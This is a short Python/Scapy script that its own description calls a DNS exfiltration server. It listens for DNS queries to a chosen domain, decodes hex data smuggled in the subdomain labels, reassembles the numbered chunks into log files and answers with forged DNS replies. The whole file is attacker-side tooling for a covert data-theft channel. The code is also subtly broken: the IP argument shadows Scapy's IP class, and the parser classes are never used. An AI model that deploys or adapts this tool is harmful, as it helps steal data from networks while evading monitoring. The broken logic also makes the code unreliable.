# IN SCAPY

from scapy.all import *
from dnslib import DNSRecord
import argparse
import random
import os

# Argument parsing
parser = argparse.ArgumentParser(description="DNS exfiltration server using Scapy")
parser.add_argument('-p', '--port', help='Port to listen on', type=int, default=53)
parser.add_argument('ip', type=str)
parser.add_argument('domain', type=str)
args = parser.parse_args()

PORT = args.port
IP = args.ip
DOMAIN = args.domain
SAVE_PATH = "./logs"

# Data Parser class
class DataParser():
    def __init__(self, ip):
        self.last_received = -1
        self.data = bytearray()
        self.ip = ip

    def add(self, packet_number: int, data: bytes):
        if packet_number == self.last_received:
            return  # Skip duplicate packet
        if packet_number <= self.last_received:
            raise Exception("Out of order packet")
        self.data.extend(data)
        self.last_received = packet_number

    def save_to_disk(self, path: str, id: int):
        os.makedirs(path, exist_ok=True)
        with open(f'{path}/{id}-{self.ip}-{int(time.time())}.log', 'wb') as file:
            file.write(self.data)

# Manage multiple parsers
class DataParserManager():
    def __init__(self):
        self.parsers = []

    def add_parser(self, parser: DataParser):
        self.parsers.append(parser)

    def parse(self, data, connection_id):
        parser = self.parsers[connection_id]
        packet_number = int(data.split(".")[0])
        hex_data = data.split(".")[1]
        parser.add(packet_number, bytes.fromhex(hex_data))

# Packet handler
def handle_dns_packet(packet):
    if packet.haslayer(DNS) and packet[DNS].opcode == 0:  # DNS query
        domain = packet[DNSQR].qname.decode()
        if DOMAIN in domain:
            print(f"Exfiltrated data: {domain}")
            # The logic to parse the data and respond as needed.
            # Example:
            response = IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport)/DNS(
                id=packet[DNS].id, qr=1, aa=1, qd=packet[DNSQR],
                an=DNSRR(rrname=packet[DNSQR].qname, rdata=IP)
            )
            send(response)
        else:
            print(f"Unrelated DNS request: {domain}")

# Start sniffing DNS packets
sniff(filter=f"udp port {PORT}", prn=handle_dns_packet)
